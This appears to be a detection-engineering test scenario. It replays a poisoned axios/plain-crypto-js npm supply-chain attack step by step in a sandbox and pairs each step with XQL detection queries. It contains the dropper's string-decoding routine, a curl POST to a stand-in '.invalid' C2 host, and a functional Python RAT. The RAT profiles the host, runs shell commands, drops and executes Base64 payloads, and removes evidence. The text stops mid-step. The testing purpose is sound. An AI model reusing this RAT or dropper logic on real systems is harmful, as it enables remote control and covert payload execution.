# Sandbox layout (every step re-states the root; each step is its own shell):
#   /var/tmp/.cortexsim-axios/proj/node_modules/{axios,plain-crypto-js}   poisoned tree
#   /var/tmp/.cortexsim-axios/tmp/ld.py                                   mirror of /tmp/ld.py
#   /var/tmp/.cortexsim-axios/tmp/.<6 chars>                              peinject drop (mirror of /tmp/.<6 chars>)
#   /var/tmp/.cortexsim-axios/c2/{tasking.d,results.d,outbox}             local stand-in for the C2 channel
#   /var/tmp/.cortexsim-axios/home/dev                                    decoy home (never a real one)
#   /var/tmp/.cortexsim-axios/run/{ld.pid,expires-at,ld.log}              pidfile, self-expiry deadline, RAT log
steps:
  - id: step-01
    name: "Poisoned dependency tree lands in node_modules and the postinstall dropper's string table is decoded"
    # What the sensor records: directory and file creates under
    # <root>/proj/node_modules/plain-crypto-js/ by the step shell and cat
    # (FILE_CREATE_NEW / FILE_WRITE were recorded under /var/tmp in this lab on
    # 2026-11-11; FILE_DIR_CREATE, the sub-type Unit 42's package-directory
    # query keys on, has not been observed here), then a python3 PROCESS_START
    # whose command line names .../plain-crypto-js/setup.js (the declared row
    # also requires a python image name, so step-04's `rm` of the same path
    # cannot satisfy it). That process does
    # the dropper's real decode: reverse, Base64-decode, XOR with the published
    # key. STAGED: npm install and `node setup.js` do not run (no node on the
    # endpoint), and nothing is declared on them. This is the root step.
    command: |
      # REAL file writes and a REAL decode. STAGED: the npm -> node hop.
      # Only lab strings are encoded in the table below (mirrored drop path,
      # published POST body, .invalid canary URL, launch template). The real C2
      # is not in it.
      set -eu
      R=/var/tmp/.cortexsim-axios
      case "$R" in
        /var/tmp/.cortexsim-axios) ;;
        *) echo "[CortexSim] refuse: sandbox root must be /var/tmp/.cortexsim-axios" >&2; exit 2 ;;
      esac
      # A RAT left by an earlier run is ended before its sandbox is replaced.
      if [ -d "$R" ] && [ ! -L "$R" ] && [ -O "$R" ] && [ -f "$R/run/ld.pid" ] && grep -q cortexsim-axios "/proc/$(cat "$R/run/ld.pid")/cmdline" 2>/dev/null; then
        kill "$(cat "$R/run/ld.pid")" 2>/dev/null || true
      fi
      rm -rf "$R"
      mkdir -m 700 "$R"
      P="$R/proj/node_modules/plain-crypto-js"
      mkdir -p "$R/proj/node_modules/axios" "$P" "$R/tmp" "$R/run"
      mkdir -p "$R/c2/tasking.d" "$R/c2/results.d" "$R/c2/outbox"
      mkdir -p "$R/home/dev/.config" "$R/home/dev/Documents" "$R/home/dev/Desktop"
      # Victim project. Lab stand-ins: no registry URL and no integrity hash.
      cat > "$R/proj/package.json" <<'EOF'
      {"name": "cortexsim-demo-app", "version": "1.0.0", "private": true, "dependencies": {"axios": "1.14.1"}}
      EOF
      cat > "$R/proj/package-lock.json" <<'EOF'
      {"name": "cortexsim-demo-app", "lockfileVersion": 3, "packages": {
        "node_modules/axios": {"version": "1.14.1", "dependencies": {"plain-crypto-js": "^4.2.1"}},
        "node_modules/plain-crypto-js": {"version": "4.2.1"}}}
      EOF
      # Published: axios 1.14.1 carries plain-crypto-js as a runtime dependency.
      # The caret range is from the linked source.
      cat > "$R/proj/node_modules/axios/package.json" <<'EOF'
      {"name": "axios", "version": "1.14.1", "dependencies": {"plain-crypto-js": "^4.2.1"}}
      EOF
      # Published: the postinstall hook runs setup.js. The exact script string
      # is from the linked source.
      cat > "$P/package.json" <<'EOF'
      {"name": "plain-crypto-js", "version": "4.2.1", "scripts": {"postinstall": "node setup.js"}}
      EOF
      # Published: package.md is the clean decoy manifest that later replaces
      # package.json. Version 4.2.0 with no hook is from the linked source.
      cat > "$P/package.md" <<'EOF'
      {"name": "plain-crypto-js", "version": "4.2.0"}
      EOF
      # Stand-in dropper: an inert string table, encoded the published way
      # (XOR with the key, then Base64, then reversed). It is never executed.
      cat > "$P/setup.js" <<'EOF'
      // CortexSim SIM-KOI-012 stand-in for the plain-crypto-js postinstall dropper.
      // Inert: a string table only. Nothing here fetches or runs anything.
      const stq = [
        "=0TFZQ1IfcECwA3NK4FSu0hWMczJhERRfxiHYURKrs2FWZEY",
        "==gdRQVRr8VRVsGO2oQGd9jXZYRI4UiDUF1P",
        "=QwA/JwBXJHc0V1BIUHVelQJpoCDZkUPRlFBnIXKMQESqQURKcSc2ZgGDBSWPRwaw5XFDR0J",
        "pBBRARGLhVEBeBCWDxBN/RDEf9VI"
      ];
      module.exports = stq;
      EOF
      printf 'CORTEXSIM-DECOY\n' > "$R/home/dev/.config/app.conf"
      printf 'CORTEXSIM-DECOY\n' > "$R/home/dev/Documents/notes.txt"
      printf 'CORTEXSIM-DECOY\n' > "$R/home/dev/Desktop/readme.txt"
      # The dropper's run-time string decode, done for real. Published: string
      # reversal, Base64 decoding and an XOR cipher with the key OrDeR_7077.
      # The position-dependent key index (7 * i * i mod 10) is from the linked
      # source. Exits 1 unless the table decodes to the expected lab strings.
      python3 - "$P/setup.js" "$R" <<'PY'
      import base64
      import re
      import sys

      KEY = b"OrDeR_7077"
      text = open(sys.argv[1]).read()
      body = text.split("const stq = [", 1)[1].split("];", 1)[0]
      table = re.findall(r'"([A-Za-z0-9+/=]+)"', body)


      def decode(blob):
          raw = base64.b64decode(blob[::-1])
          return bytes(b ^ KEY[(7 * i * i) % 10] for i, b in enumerate(raw)).decode()


      plain = [decode(blob) for blob in table]
      for n, value in enumerate(plain):
          print("[CortexSim] stq[%d] -> %s" % (n, value))
      good = (
          len(plain) == 4
          and plain[0] == sys.argv[2] + "/tmp/ld.py"
          and plain[1] == "packages.npm.org/product2"
          and plain[2].endswith(".invalid:8000/6202033")
      )
      sys.exit(0 if good else 1)
      PY
      ls -la "$P"
      echo "[CortexSim] SIM-KOI-012 step-01: plain-crypto-js 4.2.1 staged under $P and its string table decoded"
    identity: root
    mitre_technique: "T1204.005"
    platforms: ["linux"]
    requires_interpreters: ["python"]
    expected_detections:
      - plane: KOI
        type: XQL
        description: "Validation — the plain-crypto-js tree is written under node_modules and its setup.js string table is decoded (a file create or write in that directory, or the python3 process start that names setup.js). Tier-2 verify only"
        ttp_ref: "TTP-2026-0203"
        detection_id: xql-koi-012-plain-crypto-js-tree-written-and-setup-js-strings-decoded
        verification_xql: |
          dataset = xdr_data
          | filter (event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_DIR_CREATE, ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE) and action_file_path contains "/var/tmp/.cortexsim-axios/proj/node_modules/plain-crypto-js")
             or (event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and action_process_image_name ~= "^python" and action_process_image_command_line contains "/var/tmp/.cortexsim-axios/proj/node_modules/plain-crypto-js/setup.js")
          | fields _time, agent_hostname, actor_causality_id, actor_process_image_name, event_sub_type, action_file_path, action_process_image_command_line

  - id: step-02
    name: "First-stage fetch: POST the Linux body to the C2 canary and drop the Python RAT at the mirrored /tmp/ld.py"
    # What the sensor records: a curl PROCESS_START whose command line carries
    # -o <root>/tmp/ld.py, -d packages.npm.org/product2 and :8000/6202033, then
    # a failed name lookup (a .invalid name never resolves, so there is no
    # connection, no network row and no rare-host Analytics BIOC), then
    # FILE_CREATE_NEW / FILE_WRITE on <root>/tmp/ld.py. Unit 42's File
    # Indicators regex is unanchored, so it also matches this mirrored path.
    # Published: the POST body, port 8000, path /6202033, /tmp/ld.py. The Linux
    # download line is not fully published: -o and -d are on the macOS line in
    # Figure 1 and `curl -o /tmp/ld.py` is in the linked source; -s is on the
    # macOS line only. --max-time and --noproxy are lab bounds, not attacker
    # behaviour. packages.npm.org/product2 is POST data, never a destination.
    command: |
      # REAL curl process and REAL file write. Nothing is fetched: the canary
      # does not resolve, so the RAT script is written locally as a stand-in.
      set -eu
      sleep 40   # dwell: back-to-back steps lost telemetry in this lab (2026-11-11)
      R=/var/tmp/.cortexsim-axios
      [ -d "$R" ] && [ ! -L "$R" ] && [ -O "$R" ] || { echo "sandbox $R is missing or not ours: step-01 did not complete" >&2; exit 1; }
      U=http://axios-c2.cortexsim-canary.invalid:8000/6202033
      curl -o "$R/tmp/ld.py" -d packages.npm.org/product2 -s --max-time 3 --noproxy '*' "$U" || true
      cat > "$R/tmp/ld.py" <<'PYRAT'
      #!/usr/bin/env python3
      # CortexSim SIM-KOI-012 lab stand-in for the Linux Python RAT (published path /tmp/ld.py).
      # Benign by construction:
      #   - no listening socket; tasking is read only from a spool inside the sandbox
      #   - peinject runs only a file this script wrote under the sandbox
      #   - the HTTP POST goes to a .invalid name, bounded to 3 s, and is expected to fail;
      #     if that name ever resolves (a resolver that rewrites NXDOMAIN), nothing is sent
      #   - it exits when told to (kill), 15 minutes after launch, or when the sandbox is gone
      # Published by Unit 42: C2 URL as the only argument, Base64-encoded JSON by HTTP POST,
      # a 60 s beacon, one hard-coded user-agent, and the verbs kill / runscript / peinject / rundir.
      # From the linked source (Elastic Security Labs, not Unit 42): the message type names,
      # the 16-character session id, the host-profile keys and sources, the Script / Param
      # fields, and the peinject calls (dot-file with a random 6-character name, chmod 0o777,
      # Popen). Lab choices: every other JSON key, and the spool that stands in for C2 replies.
      import base64
      import json
      import os
      import platform
      import random
      import shlex
      import socket
      import string
      import subprocess
      import sys
      import threading
      import time
      import urllib.parse
      import urllib.request

      ROOT = "/var/tmp/.cortexsim-axios"
      C2_URL = sys.argv[1] if len(sys.argv) > 1 else ""
      # Exactly as Unit 42 prints it (no closing parenthesis).
      USER_AGENT = "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0"
      BEACON_SECONDS = 60
      POLL_SECONDS = 3
      ALNUM = string.ascii_letters + string.digits
      SESSION = "".join(random.choice(ALNUM) for _ in range(16))
      DECOY_DIRS = [ROOT + "/home/dev", ROOT + "/home/dev/.config",
                    ROOT + "/home/dev/Documents", ROOT + "/home/dev/Desktop"]
      NO_PROXY = urllib.request.build_opener(urllib.request.ProxyHandler({}))
      sent = [0]


      def log(message):
          try:
              with open(ROOT + "/run/ld.log", "a") as fh:
                  fh.write("%d %s\n" % (time.time(), message))
          except OSError:
              pass


      def lab_guard():
          host = urllib.parse.urlsplit(C2_URL).hostname or ""
          here = os.path.realpath(__file__)
          if not here.startswith(ROOT + "/") or not host.endswith(".invalid"):
              sys.exit(2)


      def expired():
          try:
              with open(ROOT + "/run/expires-at") as fh:
                  return time.time() >= int(fh.read().strip())
          except (OSError, ValueError):
              return True


      def read(path):
          try:
              with open(path, errors="replace") as fh:
                  return fh.read().strip()
          except OSError:
              return ""


      def post(message):
          wire = base64.b64encode(json.dumps(message).encode())
          sent[0] += 1
          with open("%s/c2/outbox/%03d-%s.b64" % (ROOT, sent[0], message["type"]), "wb") as fh:
              fh.write(wire)

          def send():
              # Fail closed. A .invalid name must never resolve (RFC 6761). On a
              # resolver that rewrites NXDOMAIN it would, and the body carries this
              # host's name, user and process list: in that case nothing is sent.
              target = urllib.parse.urlsplit(C2_URL)
              try:
                  socket.getaddrinfo(target.hostname, target.port or 80)
              except socket.gaierror:
                  pass
              except Exception as exc:
                  log("post %s skipped: lookup error %s" % (message["type"], exc.__class__.__name__))
                  return
              else:
                  log("post %s skipped: the canary name resolved, nothing was sent" % message["type"])
                  return
              try:
                  req = urllib.request.Request(C2_URL, data=wire, method="POST",
                                               headers={"User-Agent": USER_AGENT})
                  NO_PROXY.open(req, timeout=3).read()
              except Exception as exc:
                  log("post %s failed: %s" % (message["type"], exc.__class__.__name__))

          worker = threading.Thread(target=send, daemon=True)
          worker.start()
          worker.join(3)


      def list_dir(path):
          real = os.path.realpath(path)
          if not (real + "/").startswith(ROOT + "/"):
              return {"path": path, "error": "outside the sandbox (lab guard)"}
          entries = []
          try:
              for name in sorted(os.listdir(real)):
                  full = os.path.join(real, name)
                  info = os.lstat(full)
                  is_dir = os.path.isdir(full)
                  entries.append({"name": name, "size": info.st_size,
                                  "type": "dir" if is_dir else "file",
                                  "created": int(info.st_ctime), "modified": int(info.st_mtime),
                                  "children": len(os.listdir(full)) if is_dir else None})
          except OSError as exc:
              return {"path": path, "error": exc.__class__.__name__}
          return {"path": path, "entries": entries}


      def host_profile():
          procs = []
          for pid in sorted((p for p in os.listdir("/proc") if p.isdigit()), key=int):
              fields = dict(line.split(":", 1) for line in read("/proc/%s/status" % pid).splitlines()
                            if ":" in line)
              # Lab reduction: the command line is read, but only argv[0]'s base name is kept.
              first = read("/proc/%s/cmdline" % pid).split("\0")[0]
              procs.append({"pid": int(pid), "ppid": int(fields.get("PPid", "0").strip() or 0),
                            "uid": (fields.get("Uid", "").split() or [""])[0],
                            "name": os.path.basename(first) or fields.get("Name", "").strip()})
          try:
              user = os.getlogin()
          except OSError:
              user = str(os.getuid())
          return {"hostname": read("/proc/sys/kernel/hostname"), "username": user,
                  "os": platform.system() + " " + platform.release(), "processList": procs}


      def peinject(task):
          path = "%s/tmp/.%s" % (ROOT, "".join(random.choice(ALNUM) for _ in range(6)))
          reply = {"type": "rsp_peinject", "path": path}
          try:
              with open(path, "wb") as fh:
                  fh.write(base64.b64decode(task.get("Payload", "")))
              os.chmod(path, 0o777)
              child = subprocess.Popen([path] + shlex.split(task.get("Param", "")), cwd=ROOT,
                                       stdin=subprocess.DEVNULL, stdout=subprocess.PIPE,
                                       stderr=subprocess.STDOUT)
          except OSError as exc:
              # The payload did not start: 127 not found, 126 blocked / noexec / wrong architecture.
              reply["error"] = "%s: %s" % (exc.__class__.__name__, exc.strerror)
              return reply, 127 if isinstance(exc, FileNotFoundError) else 126
          try:
              output, _ = child.communicate(timeout=20)
              status = child.returncode
          except subprocess.TimeoutExpired:
              child.kill()
              output, _ = child.communicate()
              reply["timed_out"] = True
              status = 124
          reply["rc"] = status
          reply["output"] = output.decode("utf-8", "replace")[-400:]
          # Shell convention for the step: a child killed by signal N reports 128 + N.
          return reply, (128 - status) if status < 0 else status


      def run_task(task):
          kind = task.get("type")
          if kind == "rundir":
              return {"type": "rsp_rundir", "listings": [list_dir(p) for p in task.get("Paths", [])]}, 0
          if kind == "runscript":
              if task.get("Script"):
                  return {"type": "rsp_runscript", "error": "inline Script is not implemented in the lab stand-in"}, 2
              try:
                  done = subprocess.run(task.get("Param", ""), shell=True, cwd=ROOT, timeout=15,
                                        stdin=subprocess.DEVNULL, stdout=subprocess.PIPE,
                                        stderr=subprocess.STDOUT)
              except subprocess.TimeoutExpired:
                  return {"type": "rsp_runscript", "error": "timeout"}, 124
              return {"type": "rsp_runscript", "rc": done.returncode,
                      "output": done.stdout.decode("utf-8", "replace")[-2000:]}, done.returncode
          if kind == "peinject":
              return peinject(task)
          if kind == "kill":
              return {"type": "rsp_kill"}, 0
          return {"type": "lab_unsupported", "error": "unknown task type"}, 2


      def write_file(path, text):
          with open(path + ".part", "w") as fh:
              fh.write(text)
          os.replace(path + ".part", path)


      def main():
          lab_guard()
          log("start session=%s" % SESSION)
          post({"type": "FirstInfo", "uid": SESSION, "os": "linux_x64",
                "dirs": [list_dir(d) for d in DECOY_DIRS]})
          post(dict(host_profile(), type="BaseInfo", uid=SESSION))
          last_beacon = time.time()
          spool = ROOT + "/c2/tasking.d"
          while not expired():
              if time.time() - last_beacon >= BEACON_SECONDS:
                  post({"type": "BaseInfo", "uid": SESSION, "time": int(time.time())})
                  last_beacon = time.time()
              try:
                  names = sorted(n for n in os.listdir(spool) if n.endswith(".json"))
              except OSError:
                  break
              for name in names:
                  try:
                      with open(os.path.join(spool, name)) as fh:
                          task = json.load(fh)
                      os.replace(os.path.join(spool, name), os.path.join(spool, name + ".done"))
                  except (OSError, ValueError):
                      continue
                  reply, status = run_task(task)
                  reply["uid"] = SESSION
                  stem = ROOT + "/c2/results.d/" + name[:-5]
                  write_file(stem + ".json", json.dumps(reply))
                  write_file(stem + ".rc", "%d\n" % status)
                  log("task %s %s status=%d" % (name, task.get("type"), status))
                  post({"type": "CmdResult", "uid": SESSION, "data": reply})
                  if task.get("type") == "kill":
                      log("exit on kill")
                      return 0
              time.sleep(POLL_SECONDS)
          log("exit: expired or sandbox removed")
          return 0


      if __name__ == "__main__":
          sys.exit(main())
      PYRAT
      chmod 600 "$R/tmp/ld.py"
      test -s "$R/tmp/ld.py"
      echo "[CortexSim] SIM-KOI-012 step-02: canary POST attempted; RAT stand-in written to $R/tmp/ld.py ($(wc -c < "$R/tmp/ld.py") bytes)"
    identity: root
    mitre_technique: "T1105"
    platforms: ["linux"]
    causality:
      parent_step: step-01
      pivot: process_lineage
    expected_detections:
      - plane: KOI
        type: XQL
        description: "Validation — the RAT script is written at the mirrored /tmp/ld.py, or curl starts with the Linux POST body and that output path. Tier-2 verify only"
        ttp_ref: "TTP-2026-0203"
        detection_id: xql-koi-012-first-stage-fetch-and-rat-script-written-at-mirrored-tmp-ld-py
        verification_xql: |
          dataset = xdr_data
          | filter (event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE, ENUM.FILE_RENAME) and action_file_path = "/var/tmp/.cortexsim-axios/tmp/ld.py")
             or (event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and action_process_image_name = "curl" and action_process_image_command_line contains "packages.npm.org/product2" and action_process_image_command_line contains "/var/tmp/.cortexsim-axios/tmp/ld.py")
          | fields _time, agent_hostname, actor_causality_id, actor_process_image_name, event_sub_type, action_file_path, action_process_image_command_line

  - id: step-03
    name: "Launch the Python RAT in the background with nohup, the C2 URL as its only argument; first check-in"
    # What the sensor records: PROCESS_START of nohup and then python3 with the
    # command line `python3 <root>/tmp/ld.py http://<canary>:8000/6202033`,
    # the shape of Figure 1's Linux line. Match the command line, not the image
    # name: the agent may report python3 as python3.12. The declared row keys on
    # `ld.py <URL>` (the script path followed by the URL), because step-02's
    # curl line also carries both the path and the port and must not satisfy
    # it. The process is
    # long-lived, reads /proc for its host profile, and tries an HTTP POST to
    # the canary now and every 60 s; each attempt fails name resolution, so
    # nothing reaches the network. With the causality contract the beacon runs
    # every step under ONE anchor shell, so the RAT survives into later steps;
    # the beacon ends the anchor's process group when the run ends, and the RAT
    # also exits on its own 15 minutes after launch. Output is sent to
    # /dev/null and stdin is closed so the RAT holds none of the beacon's pipes.
    command: |
      # REAL long-lived python3 process, launched the published way.
      set -eu
      sleep 40   # dwell
      R=/var/tmp/.cortexsim-axios
      [ -d "$R" ] && [ ! -L "$R" ] && [ -O "$R" ] || { echo "sandbox $R is missing or not ours: step-01 did not complete" >&2; exit 1; }
      U=http://axios-c2.cortexsim-canary.invalid:8000/6202033
      alive() { kill -0 "$1" 2>/dev/null && ! grep -q '^State:[[:space:]]*Z' "/proc/$1/status" 2>/dev/null; }
      expr "$(date +%s)" + 900 > "$R/run/expires-at"
      nohup python3 "$R/tmp/ld.py" "$U" > /dev/null 2>&1 < /dev/null &
      echo $! > "$R/run/ld.pid"
      n=0
      while [ ! -f "$R/c2/outbox/001-FirstInfo.b64" ] || [ ! -f "$R/c2/outbox/002-BaseInfo.b64" ]; do
        n=$((n + 1))
        if [ "$n" -gt 15 ]; then
          echo "[CortexSim] the RAT did not complete its first check-in within 15 s" >&2
          exit 1
        fi
        sleep 1
      done
      if ! alive "$(cat "$R/run/ld.pid")"; then
        echo "[CortexSim] the RAT exited after its first check-in" >&2
        exit 1
      fi
      ls -la "$R/c2/outbox"
      echo "[CortexSim] SIM-KOI-012 step-03: RAT running as pid $(cat "$R/run/ld.pid"); FirstInfo and BaseInfo queued; it expires on its own in 15 minutes"
    identity: root
    mitre_technique: "T1059.006"
    platforms: ["linux"]
    requires_interpreters: ["python"]
    causality:
      parent_step: step-02
      pivot: process_lineage
    expected_detections:
      - plane: KOI
        type: XQL
        description: "Validation — python3 starts on the mirrored ld.py with the C2 canary URL (port 8000, path /6202033) as its argument. Tier-2 verify only"
        ttp_ref: "TTP-2026-0203"
        detection_id: xql-koi-012-python-rat-launched-with-c2-url-argument
        verification_xql: |
          dataset = xdr_data
          | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
          | filter action_process_image_command_line ~= "/var/tmp/[.]cortexsim-axios/tmp/ld[.]py +https?://" and action_process_image_command_line contains ":8000/6202033"
          | fields _time, agent_hostname, actor_causality_id, causality_actor_process_image_name, actor_process_image_name, action_process_image_name, action_process_image_command_line

  - id: step-04
    name: "Dropper anti-forensics: delete setup.js and swap the clean decoy manifest over package.json"
    # What the sensor records: PROCESS_START of rm (command line naming
    # plain-crypto-js/setup.js) and of mv (naming plain-crypto-js/package.md),
    # a FILE_REMOVE on setup.js (FILE_REMOVE was recorded under /var/tmp in
    # this lab) and a rename onto package.json (FILE_RENAME has not been
    # observed here, so the declared row keys on the mv process start).
    # Published: the dropper deletes setup.js and replaces the tampered
    # package.json with the decoy package.md. The linked source adds that the
    # decoy is renamed over package.json and that only the lockfile keeps the
    # evidence, which the last line of this step shows.
    command: |
      # REAL unlink and rename.
      set -eu
      sleep 40   # dwell
      R=/var/tmp/.cortexsim-axios
      [ -d "$R" ] && [ ! -L "$R" ] && [ -O "$R" ] || { echo "sandbox $R is missing or not ours: step-01 did not complete" >&2; exit 1; }
      P=/var/tmp/.cortexsim-axios/proj/node_modules/plain-crypto-js
      test -f "$P/setup.js"
      rm -f "$P/setup.js"
      mv -f "$P/package.md" "$P/package.json"
      test ! -e "$P/setup.js"
      if grep -q postinstall "$P/package.json"; then
        echo "[CortexSim] the postinstall hook is still in package.json" >&2
        exit 1
      fi
      ls -la "$P"
      cat "$P/package.json"
      grep -o '"node_modules/plain-crypto-js": {"version": "[0-9.]*"' /var/tmp/.cortexsim-axios/proj/package-lock.json
      echo "[CortexSim] SIM-KOI-012 step-04: setup.js removed and the 4.2.0 decoy manifest is now package.json; the lockfile still names 4.2.1"
    identity: root
    mitre_technique: "T1070.004"
    platforms: ["linux"]
    causality:
      parent_step: step-03
      pivot: process_lineage
    expected_detections:
      - plane: KOI
        type: XQL
        description: "Validation — mv renames the decoy package.md over package.json inside the plain-crypto-js directory after setup.js is removed. Tier-2 verify only"
        ttp_ref: "TTP-2026-0203"
        detection_id: xql-koi-012-decoy-manifest-renamed-over-package-json
        verification_xql: |
          dataset = xdr_data
          | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
          | filter action_process_image_name = "mv" and action_process_image_command_line contains "/var/tmp/.cortexsim-axios/proj/node_modules/plain-crypto-js/package.md"
          | fields _time, agent_hostname, actor_causality_id, action_process_image_command_line

  - id: step-05
    name: "Operator tasking over the RAT: rundir, then runscript"
    # What the sensor records: the RAT (python3 ...ld.py) lists the decoy
    # directories, then runs the Param string through
    # subprocess.run(shell=True): PROCESS_START of a shell and of id, uname and
    # ls whose actor command line contains <root>/tmp/ld.py. The shell may be
    # reported as sh or dash, so the declared row keys on the actor command
    # line and on `uname -a` in the child command line, not on an image name.
    # Published: the verbs runscript and rundir. Linked source: the keys type,
    # Script and Param, and that an empty Script runs Param as a shell command.
    # Lab choices, not attributed to the threat: the key Paths, the command
    # text, and the spool that stands in for the HTTP reply that cannot arrive.
    command: |
      # REAL directory listing and REAL shell children of the running RAT.
      set -eu
      sleep 40   # dwell
      R=/var/tmp/.cortexsim-axios
      [ -d "$R" ] && [ ! -L "$R" ] && [ -O "$R" ] || { echo "sandbox $R is missing or not ours: step-01 did not complete" >&2; exit 1; }
      # Each task is written under a temporary name, then renamed into the spool.
      printf '{"type":"rundir","Paths":["%s","%s","%s","%s"]}\n' "$R/home/dev" "$R/home/dev/.config" "$R/home/dev/Documents" "$R/home/dev/Desktop" > "$R/c2/tasking.d/.001"
      mv "$R/c2/tasking.d/.001" "$R/c2/tasking.d/001.json"
      printf '{"type":"runscript","Script":"","Param":"id; uname -a; ls -la %s"}\n' "$R/home/dev" > "$R/c2/tasking.d/.002"
      mv "$R/c2/tasking.d/.002" "$R/c2/tasking.d/002.json"
      n=0
      while [ ! -f "$R/c2/results.d/001.rc" ] || [ ! -f "$R/c2/results.d/002.rc" ]; do
        n=$((n + 1))
        if [ "$n" -gt 30 ]; then
          echo "[CortexSim] the RAT did not answer rundir and runscript within 30 s" >&2
          exit 1
        fi
        sleep 1
      done
      cat "$R/c2/results.d/001.json"; echo
      cat "$R/c2/results.d/002.json"; echo
      test "$(cat "$R/c2/results.d/001.rc")" = 0
      test "$(cat "$R/c2/results.d/002.rc")" = 0
      echo "[CortexSim] SIM-KOI-012 step-05: rsp_rundir and rsp_runscript received"
    identity: root
    mitre_technique: "T1059.004"
    platforms: ["linux"]
    causality:
      parent_step: step-04
      pivot: process_lineage
    expected_detections:
      - plane: KOI
        type: XQL
        description: "Validation — the RAT process (ld.py in the actor command line) spawns a shell child for runscript whose command line carries uname -a. Tier-2 verify only"
        ttp_ref: "TTP-2026-0203"
        detection_id: xql-koi-012-rat-runscript-spawns-shell-child
        verification_xql: |
          dataset = xdr_data
          | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
          | filter actor_process_command_line contains "/var/tmp/.cortexsim-axios/tmp/ld.py" and action_process_image_command_line contains "uname -a"
          | fields _time, agent_hostname, actor_causality_id, actor_process_command_line, action_process_image_name, action_process_image_command_line

  - id: step-06
    name: "peinject: the RAT Base64-decodes a binary to a hidden dot-file, marks it executable and runs it (WildFire test ELF)"
    # What the sensor records: curl's PROCESS_START and its connection to
    # wildfire.paloaltonetworks.com (lab plumbing: nothing is declared on it;
    # the built-in "UNIX LOLBIN process connected to a rare external host"
    # Analytics BIOC may or may not fire, it is rarity-based and Low), then
    # FILE_CREATE_NEW / FILE_WRITE of <root>/tmp/.<6 chars> by python3, then a
    # PROCESS_START of that dot-file whose actor is python3 ...ld.py. Executing
    # the official test ELF is what raised "Local Analysis Malware" (HIGH,
    # detection method TRAPS) on this endpoint on 2026-11-11, from a shell.
    # Not yet observed: the same verdict when python3 spawns the ELF from a
    # dot-file name. Key nothing on the ELF's hash: two downloads seconds apart
    # (2026-11-11, author's container) returned two different SHA256 values.
    # Published: the verb peinject drops and executes a binary.
    # Linked source: the Base64 decode to /tmp/.<random 6 characters>, chmod
    # 0o777 and Popen. Lab choice: the key Payload.
    # Exit code: 0 when the payload ran (report mode; the test ELF prints
    # "Sample Executed Successfully." and exits 0). 126 or 127 when it did not
    # start (blocked, noexec, wrong architecture). 128 + N when it was killed
    # by signal N. Neither is masked.
    # Bound: 40 s dwell + download (45 s cap) + spool pickup (3 s) + child wait
    # (20 s cap) is about 110 s at worst, under the beacon's 180 s step timeout.
    # Measured 43 s in the author's container.
    command: |
      # The ONE real download in this scenario: Palo Alto Networks' official
      # WildFire test ELF, a benign file built to be classified malicious,
      # fetched the way SIM-EDR-023 step-01 fetches it (--max-time is a lab
      # bound). It stands in for the binary an operator would return in a
      # peinject reply.
      set -eu
      sleep 40   # dwell
      R=/var/tmp/.cortexsim-axios
      [ -d "$R" ] && [ ! -L "$R" ] && [ -O "$R" ] || { echo "sandbox $R is missing or not ours: step-01 did not complete" >&2; exit 1; }
      curl -fsSL --max-time 45 https://wildfire.paloaltonetworks.com/publicapi/test/elf -o "$R/c2/payload.bin"
      sha256sum "$R/c2/payload.bin"
      { printf '{"type":"peinject","Param":"","Payload":"'; base64 -w0 "$R/c2/payload.bin"; printf '"}\n'; } > "$R/c2/tasking.d/.003"
      mv "$R/c2/tasking.d/.003" "$R/c2/tasking.d/003.json"
      n=0
      while [ ! -f "$R/c2/results.d/003.rc" ]; do
        n=$((n + 1))
        if [ "$n" -gt 45 ]; then
          echo "[CortexSim] the RAT did not answer peinject within 45 s" >&2
          exit 1
        fi
        sleep 1
      done
      cat "$R/c2/results.d/003.json"; echo
      rc="$(cat "$R/c2/results.d/003.rc")"
      echo "[CortexSim] SIM-KOI-012 step-06: peinject child status=$rc at $(date -u +%FT%TZ)"
      case "$rc" in
        126|127) echo "[CortexSim] the payload did not execute (status $rc): blocked, noexec or wrong architecture" >&2; exit "$rc" ;;
      esac
      [ "$rc" -lt 129 ] || exit "$rc"
      exit 0
    identity: root
    mitre_technique: "T1105"
    platforms: ["linux"]
    causality:
      parent_step: step-05
      pivot: process_lineage
    expected_detections:
      - plane: EDR
        type: Prevention
        # outcome: detect. Report mode scores the verdict as detected; there is
        # no two-witness requirement on this row. The payload is a grandchild
        # of the RAT, not of the step shell, so a block-mode kill is not this
        # row's contract.
        outcome: detect
        description: "Agent Local Analysis verdict on the peinject payload (the WildFire test ELF the RAT drops as a dot-file and executes) — HIGH, reported under report mode; the run's only built-in Medium-or-higher issue and its case seed"
        ttp_ref: "TTP-2026-0203"
        detection_id: prevention-local-analysis-malware
      - plane: KOI
        type: XQL
        description: "Validation — a hidden six-character dot-file runs from the mirrored /tmp, started by the RAT for peinject. Tier-2 verify only"
        ttp_ref: "TTP-2026-0203"
        detection_id: xql-koi-012-rat-peinject-runs-hidden-dot-file
        verification_xql: |
          dataset = xdr_data
          | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
          | filter action_process_image_path ~= "^/var/tmp/[.]cortexsim-axios/tmp/[.][A-Za-z0-9]{6}$"
          | fields _time, agent_hostname, actor_causality_id, actor_process_command_line, action_process_image_path, action_process_image_sha256

  - id: step-07
    name: "kill: the RAT acknowledges and exits; the chain is stitched into one issue"
    # What the sensor records: the python3 RAT process ends on its own after
    # writing rsp_kill; nothing is left running. This step carries the
    # operator-installed correlation, whose legs were all produced on this one
    # host by step-01, step-02, step-03 and step-06. The beacon does not run
    # cleanup.commands in pull mode, which is why this step ends the RAT and
    # why the RAT also expires on its own. The sandbox directory stays on disk
    # after a pull-mode run until step-01 of the next run or the cleanup
    # commands remove it.
    command: |
      # REAL: the fourth published verb ends the RAT.
      set -eu
      sleep 40   # dwell
      R=/var/tmp/.cortexsim-axios
      [ -d "$R" ] && [ ! -L "$R" ] && [ -O "$R" ] || { echo "sandbox $R is missing or not ours: step-01 did not complete" >&2; exit 1; }
